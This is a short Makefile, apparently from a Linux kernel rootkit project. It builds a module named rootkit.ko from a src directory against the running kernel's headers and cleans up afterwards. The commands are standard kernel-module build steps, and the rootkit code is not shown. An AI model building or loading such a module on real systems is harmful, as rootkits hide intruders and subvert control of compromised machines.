all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD)/src modules
	mv src/rootkit.ko .

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD)/src clean
	rm rootkit.ko 2>/dev/null || exit 0
